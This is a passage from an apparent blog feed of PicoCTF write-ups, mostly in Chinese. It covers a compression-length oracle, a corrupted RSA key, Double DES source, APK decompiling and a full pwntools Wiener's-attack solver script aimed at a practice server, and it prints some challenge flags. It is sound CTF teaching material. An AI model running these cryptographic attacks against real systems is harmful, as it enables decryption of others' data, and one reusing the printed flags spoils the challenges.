&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; len&lt;span style="color:#f92672">(&lt;/span>enc&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">33&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; enc &lt;span style="color:#f92672">=&lt;/span> zlib.compress&lt;span style="color:#f92672">(&lt;/span>bytes&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;picoCTF{tekpicoCTF{testing_123456}&amp;#34;&lt;/span>.encode&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;gt;&amp;gt;&amp;gt; len&lt;span style="color:#f92672">(&lt;/span>enc&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">34&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此時重複的部分就是&lt;code>picoCTF{&lt;/code>，若是繼續增加重複的部分(例如：&lt;code>picoCTF{te&lt;/code>)，壓縮後的長度也不會變，這樣就可以當作一個oracle，也就是利用長度來判斷增加的字元是不是flag重複的一部分&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">#!/usr/bin/python3 -u

import zlib
from random import randint
import os
from Crypto.Cipher import Salsa20

flag = open(&amp;#34;./flag&amp;#34;).read()


def compress(text):
 return zlib.compress(bytes(text.encode(&amp;#34;utf-8&amp;#34;)))

def encrypt(plaintext):
 secret = os.urandom(32)
 cipher = Salsa20.new(key=secret)
 return cipher.nonce + cipher.encrypt(plaintext)

def main():
 while True:
 usr_input = input(&amp;#34;Enter your text to be encrypted: &amp;#34;)
 compressed_text = compress(flag + usr_input)
 encrypted = encrypt(compressed_text)
 
 nonce = encrypted[:8]
 encrypted_text = encrypted[8:]
 print(nonce)
 print(encrypted_text)
 print(len(encrypted_text))

if __name__ == &amp;#39;__main__&amp;#39;:
 main()
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Cookies</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---cookies/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---cookies/</guid><description>&lt;h1 id="picoctf---cookies">
 PicoCTF - Cookies
 &lt;a class="anchor" href="#picoctf---cookies">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://mercury.picoctf.net:64944/">http://mercury.picoctf.net:64944/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的用法指南&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>-H參數添加 HTTP 請求的標頭。
&lt;code>$ curl -H 'Accept-Language: en-US' https://google.com&lt;/code>&lt;/p>&lt;/blockquote>
&lt;blockquote>
&lt;p>-s參數將不輸出錯誤和進度信息。
&lt;code>$ curl -s https://www.example.com&lt;/code>&lt;/p>&lt;/blockquote>
&lt;blockquote>
&lt;p>-L參數會讓 HTTP 請求跟隨服務器的重定向。curl 默認不跟隨重定向。
&lt;code>$ curl -L -d 'tweet=hi' https://api.twitter.com/tweet&lt;/code>&lt;/p>&lt;/blockquote>
&lt;blockquote>
&lt;p>-I參數向服務器發出 HEAD 請求，然會將服務器返回的 HTTP 標頭打印出來。
&lt;code>$ curl -I https://www.example.com&lt;/code>&lt;/p>&lt;/blockquote>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Try to analyze
When I input something, it&amp;rsquo;ll redirect to another page
&lt;img src="https://i.imgur.com/Pq7XpNZ.png" alt="" />
&lt;img src="https://i.imgur.com/pKZJWfd.png" alt="" />
I tried to change cookie to different number and also modify the different value of &lt;code>name&lt;/code> parameter however, still got wrong information.&lt;/p></description></item><item><title>PicoCTF - corrupt-key-1</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---corrupt-key-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---corrupt-key-1/</guid><description>&lt;h1 id="picoctf---corrupt-key-1">
 PicoCTF - corrupt-key-1
 &lt;a class="anchor" href="#picoctf---corrupt-key-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>private.key
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>-----BEGIN RSA PRIVATE KEY-----
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MIICXAIBAAKBgQC4yxzKmbasQYdsGIRXMqXL/Idd80bukALOYIUItfz2tgpax3Iq
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LWTvdOFEOjOOcKc+Y6MD86ya3xmFlWmfbp8wwAnSGcfZjE7IQgNhCDQCnHlWfvwI
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>9mtLw/Vkv7VxVGoGt+SPs1u5zOqaLNRDSfgpJCB436ZNUlknv9VdCZwCTwIDAQAB
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AoGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACQQDnAFaP9Qa9WJKv
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>klkhJeBsvpvUXf6v6TGjM8E0YwI9TwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAkEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJBAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACQAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;span style="color:#f92672">=&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----END RSA PRIVATE KEY-----
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>msg.enc
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>71dc d160 9ac4 a05c d14f 04a9 b43c 2aa3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>83d2 a8d6 749b b978 75d5 437a a944 45f2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4073&lt;/span> f605 ef1c &lt;span style="color:#ae81ff">5657&lt;/span> 8d0e 7a2d f3be b5c1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">7741&lt;/span> &lt;span style="color:#ae81ff">8476&lt;/span> 0b3d 44fc b97e &lt;span style="color:#ae81ff">6631&lt;/span> b6fe &lt;span style="color:#ae81ff">2487&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">6258&lt;/span> d445 a7d7 4c7c e3cc 00ec f925 f442
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c91d 10c9 cefb 9ca6 9c88 da3c 9d26 6c96
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">9033&lt;/span> 63d5 6a13 7b64 1fc3 &lt;span style="color:#ae81ff">8709&lt;/span> &lt;span style="color:#ae81ff">2416&lt;/span> f7fb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eb4c 4c94 cc8e 157f cc0e d122 159c 27d5
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>可見private.key的內文被corrupted了，必須要修復才能夠解密ciphertext，但看來看去也找不到相關的write up，或是修復的方法，從&lt;a href="https://connor-mccartney.github.io/cryptography/rsa/corrupt-key-1-picoMini">連結&lt;/a>這篇write up也看不懂如何修復，雖然他有附上code，但是很多error也無法debug(主要是看不懂)，總而言之我們的目標就是找出$p$為何&lt;/p></description></item><item><title>PicoCTF - Dachshund Attacks</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---dachshund-attacks/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---dachshund-attacks/</guid><description>&lt;h1 id="picoctf---dachshund-attacks">
 PicoCTF - Dachshund Attacks
 &lt;a class="anchor" href="#picoctf---dachshund-attacks">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>How about if the private key is too small? Refer &lt;a href="https://ctf-wiki.org/crypto/asymmetric/rsa/d_attacks/rsa_extending_wiener/">Extending Wiener’s Attack &lt;/a>&lt;/p>
&lt;h2 id="exploit---small-private-key">
 Exploit - Small Private Key
 &lt;a class="anchor" href="#exploit---small-private-key">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>git clone &lt;a href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack&lt;/a>
Put the exploit file in this repo.&lt;/li>
&lt;li>Whole Exploit
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> long_to_bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> ContinuedFractions&lt;span style="color:#f92672">,&lt;/span> Arithmetic
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>context&lt;span style="color:#f92672">.&lt;/span>arch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#34;mercury.picoctf.net&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">37455&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">wiener_hack&lt;/span>(e, n):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> frac &lt;span style="color:#f92672">=&lt;/span> ContinuedFractions&lt;span style="color:#f92672">.&lt;/span>rational_to_contfrac(e, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> convergents &lt;span style="color:#f92672">=&lt;/span> ContinuedFractions&lt;span style="color:#f92672">.&lt;/span>convergents_from_contfrac(frac)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (k, d) &lt;span style="color:#f92672">in&lt;/span> convergents:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> k &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">and&lt;/span> (e &lt;span style="color:#f92672">*&lt;/span> d &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">%&lt;/span> k &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> phi &lt;span style="color:#f92672">=&lt;/span> (e &lt;span style="color:#f92672">*&lt;/span> d &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">//&lt;/span> k
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s &lt;span style="color:#f92672">=&lt;/span> n &lt;span style="color:#f92672">-&lt;/span> phi &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> discr &lt;span style="color:#f92672">=&lt;/span> s &lt;span style="color:#f92672">*&lt;/span> s &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#f92672">*&lt;/span> n
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (discr &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> Arithmetic&lt;span style="color:#f92672">.&lt;/span>is_perfect_square(discr)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> t &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">and&lt;/span> (s &lt;span style="color:#f92672">+&lt;/span> t) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Hacked!&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>recvline()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>e &lt;span style="color:#f92672">=&lt;/span> int(str(r&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>strip()&lt;span style="color:#f92672">.&lt;/span>decode())&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span>)[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>n &lt;span style="color:#f92672">=&lt;/span> int(str(r&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>strip()&lt;span style="color:#f92672">.&lt;/span>decode())&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span>)[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c &lt;span style="color:#f92672">=&lt;/span> int(str(r&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>strip()&lt;span style="color:#f92672">.&lt;/span>decode())&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span>)[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>d &lt;span style="color:#f92672">=&lt;/span> wiener_hack(e, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(long_to_bytes(pow(c, d, n)))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://zhuanlan.zhihu.com/p/76228394">CTF_RSA解密学习指南(三) - 低解密指数攻击&lt;/a>&lt;/p></description></item><item><title>PicoCTF - Disk, disk, sleuth! II</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---disk-disk-sleuth-ii/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---disk-disk-sleuth-ii/</guid><description>&lt;h1 id="picoctf---disk-disk-sleuth-ii">
 PicoCTF - Disk, disk, sleuth! II
 &lt;a class="anchor" href="#picoctf---disk-disk-sleuth-ii">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/137?category=4&amp;amp;page=2">Disk, disk, sleuth! II&lt;/a>&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;p>All we know is the file with the flag is named &lt;code>down-at-the-bottom.txt&lt;/code>&amp;hellip; Disk image: &lt;code>dds2-alpine.flag.img.gz&lt;/code>
Hint 1: The sleuthkit has some great tools for this challenge as well.
Hint 2: Sleuthkit docs here are so helpful: &lt;a href="http://wiki.sleuthkit.org/index.php?title=TSK_Tool_Overview">TSK Tool Overview&lt;/a>
Hint 3: This disk can also be booted with &lt;a href="https://idobest.pixnet.net/blog/post/22040213">qemu&lt;/a>!&lt;/p></description></item><item><title>PicoCTF - dont-use-client-side</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---dont-use-client-side/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---dont-use-client-side/</guid><description>&lt;h1 id="picoctf---dont-use-client-side">
 PicoCTF - dont-use-client-side
 &lt;a class="anchor" href="#picoctf---dont-use-client-side">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/66?category=1&amp;amp;page=1">dont-use-client-side&lt;/a>&lt;/p>
&lt;h2 id="exploit---page-source-code">
 Exploit - Page source code
 &lt;a class="anchor" href="#exploit---page-source-code">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://i.imgur.com/UBYEt6F.png" alt="" />
&lt;code>picoCTF{no_clients_plz_b706c5}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Double DES</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/des-aes/picoctf---double-des/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/des-aes/picoctf---double-des/</guid><description>&lt;h1 id="picoctf---double-des">
 PicoCTF - Double DES
 &lt;a class="anchor" href="#picoctf---double-des">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Meet in the middle attack&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">#!/usr/bin/python3 -u
from Crypto.Cipher import DES
import binascii
import itertools
import random
import string


def pad(msg):
 block_len = 8
 over = len(msg) % block_len
 pad = block_len - over
 return (msg + &amp;#34; &amp;#34; * pad).encode()

def generate_key():
 return pad(&amp;#34;&amp;#34;.join(random.choice(string.digits) for _ in range(6)))


FLAG = open(&amp;#34;flag&amp;#34;).read().rstrip()
KEY1 = generate_key()
KEY2 = generate_key()


def get_input():
 try:
 res = binascii.unhexlify(input(&amp;#34;What data would you like to encrypt? &amp;#34;).rstrip()).decode()
 except:
 res = None
 return res

def double_encrypt(m):
 msg = pad(m)

 cipher1 = DES.new(KEY1, DES.MODE_ECB)
 enc_msg = cipher1.encrypt(msg)
 cipher2 = DES.new(KEY2, DES.MODE_ECB)
 return binascii.hexlify(cipher2.encrypt(enc_msg)).decode()


print(&amp;#34;Here is the flag:&amp;#34;)
print(double_encrypt(FLAG))

while True:
 inputs = get_input()
 if inputs:
 print(double_encrypt(inputs))
 else:
 print(&amp;#34;Invalid input.&amp;#34;)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - droids1</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---droids1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---droids1/</guid><description>&lt;h1 id="picoctf---droids1">
 PicoCTF - droids1
 &lt;a class="anchor" href="#picoctf---droids1">#&lt;/a>
&lt;/h1>
&lt;h2 id="backgroud">
 Backgroud
 &lt;a class="anchor" href="#backgroud">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-1/"> Android App 逆向入門之一：拆開與重組 apk &lt;/a>: 強烈建議新手在打之前可以先看一下這篇，稍微了解一下整體怎麼包apk以及比要檔案有哪些，或是他們儲存的資料類型之類的&lt;/p>
&lt;h2 id="tools">
 Tools
 &lt;a class="anchor" href="#tools">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://ibotpeaches.github.io/Apktool/">apktool&lt;/a>
跟著&lt;a href="https://apktool.org/docs/install">installation guide&lt;/a>就可以安裝成功，此工具目的在於拆解apk，我們知道apk就是一個壓縮檔，如果直接用unzip這種指令，也可以打開，只不過一些經過編譯後的byte code就還是byte code，而apktool可以在解壓縮的同時還原這些byte code&lt;/li>
&lt;li>&lt;a href="https://developer.android.com/studio">Android Studio&lt;/a>: 此工具目的在於利用emulator把該軟體安裝後跑起來&lt;/li>
&lt;li>&lt;a href="https://github.com/skylot/jadx">JADX&lt;/a>: 和ApkTool一樣，可以反編譯apk，但有GUI(Recommended)
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!"> $ wget https://github.com/skylot/jadx/releases/download/v1.1.0/jadx-1.1.0.zip
 $ unzip jadx-1.1.0.zip -d jadx
 $ cd jadx
 $ cd ./bin
 $ ./jadx-gui
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題有兩種方法可以反編譯apk，一種是利用ApkTool，另外一個是JADX，兩者差在有無GUI(JADX有)，主要是參考&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>的WP&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;h3 id="apktools">
 ApkTools
 &lt;a class="anchor" href="#apktools">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ apktool d one.apk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Using Apktool 2.8.1 on one.apk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Loading resource table...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Decoding AndroidManifest.xml with resources...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Loading resource table from file: C:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\L&lt;/span>ocal&lt;span style="color:#ae81ff">\a&lt;/span>pktool&lt;span style="color:#ae81ff">\f&lt;/span>ramework&lt;span style="color:#ae81ff">\1&lt;/span>.apk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Regular manifest package...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Decoding file-resources...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Decoding values */* XMLs...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Baksmaling classes.dex...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Copying assets and libs...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Copying unknown files...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I: Copying original files...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果有按照上面的guide把apktool裝起來，就可以直接下指令，參數&lt;code>d&lt;/code>代表decode，對於比較熟Android架構的人來說應該綽綽有餘，畢竟要到哪邊找code/strings之類的，通常都會是那幾個地方，例如：
Code會放在&lt;code>./smali/com/hellocmu/picoctf/&lt;/code>(PS: 只不過code很醜，畢竟是smali)
